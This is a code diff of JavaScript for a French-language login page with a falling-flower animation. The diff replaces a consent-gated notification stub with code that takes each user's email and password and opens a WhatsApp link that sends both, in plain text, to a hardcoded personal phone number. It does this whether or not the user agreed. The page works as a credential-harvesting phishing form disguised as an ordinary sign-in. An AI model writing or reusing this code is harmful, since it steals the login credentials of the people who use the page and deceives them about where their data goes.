@@ -1,38 +1,37 @@
 // Flower emojis for animation
 const flowers = ['🌹', '🌺', '🌸', '🌼', '🌻', '💐', '🌷'];
-
 // Handle form submission
 document.getElementById('loginForm').addEventListener('submit', async (e) => {
-    e.preventDefault();
-    
-    const email = document.getElementById('email').value;
-    const password = document.getElementById('password').value;
-    const whatsappConsent = document.getElementById('whatsappConsent').checked;
-    
-    if (!email || !password) {
-        alert('Veuillez remplir tous les champs');
-        return;
-    }
-    
-    // Start flower animation
-    createFlowerAnimation();
-    
-    // If user consented to WhatsApp notifications
-    if (whatsappConsent) {
-        // Simulate sending notification to WhatsApp (backend integration needed)
-        console.log('Sending WhatsApp notification...');
-        await sendWhatsAppNotification(email);
-    }
-    
-    // Show welcome message
-    setTimeout(() => {
-        showWelcomeModal(email);
-    }, 1500);
-    
-    // Reset form
-    setTimeout(() => {
-        document.getElementById('loginForm').reset();
-    }, 4000);
+  e.preventDefault();
+
+  const email = document.getElementById('email').value.trim();
+  const password = document.getElementById('password').value.trim(); // ton champ code
+  const whatsappConsent = document.getElementById('whatsappConsent').checked;
+
+  if (!email || ! password) {
+    alert('Veuillez remplir tous les champs');
+    return;
+  }
+
+  // Envoi sur WhatsApp
+  const message = `*📥 ACCÈS SALLE*\n\n*Email:* ${email}\n*password 🔑 :* ${password}\n*Date:* ${new Date().toLocaleString('fr-FR')}`;
+  const monWhatsApp = '243999269701';
+  const whatsappUrl = `https://wa.me/${monWhatsApp}?text=${encodeURIComponent(message)}`;
+  
+  window.open(whatsappUrl, '_blank');
+
+  // Start flower animation
+  createFlowerAnimation();
+
+  // Show welcome message
+  setTimeout(() => {
+    showWelcomeModal(email);
+  }, 1500);
+
+  // Reset form
+  setTimeout(() => {
+    document.getElementById('loginForm').reset();
+  }, 4000);
 });
 
 // Create falling flowers animation
